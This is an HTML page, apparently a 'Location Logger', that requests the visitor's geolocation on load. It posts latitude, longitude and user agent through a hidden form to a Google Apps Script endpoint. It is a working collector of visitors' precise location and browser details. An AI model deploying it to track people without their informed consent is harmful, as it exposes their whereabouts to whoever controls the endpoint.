<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Location Logger</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body onload="getLocation()">
  <h2>Tracking your location...</h2>

  <!-- Hidden form to submit to Google Sheets -->
  <form id="submit-form">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
    <input type="hidden" name="user_agent" id="user_agent">
  </form>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    function sendLocation(position) {
      document.getElementById('latitude').value = position.coords.latitude;
      document.getElementById('longitude').value = position.coords.longitude;
      document.getElementById('user_agent').value = navigator.userAgent;

      // Auto-submit form via jQuery AJAX
      $("#submit-form").submit();
    }

    function handleError(error) {
      console.error("Geolocation error:", error.message);
    }

    // jQuery form handler
    $("#submit-form").submit((e) => {
      e.preventDefault();
      $.ajax({
        url: "https://script.google.com/macros/s/AKfycbxsO4-ZpbPyPfRdhakl4dYwjp_qUGZmejS0VElbKR5WYEVOsr_JYFJlFMQN1oCaY9cD/exec",
        data: $("#submit-form").serialize(),
        method: "POST",
        success: function (response) {
          console.log("Form submitted to Google Sheets");
        },
        error: function (err) {
          alert("Error sending data.");
          console.error(err);
        }
      });
    });
  </script>
</body>
</html>
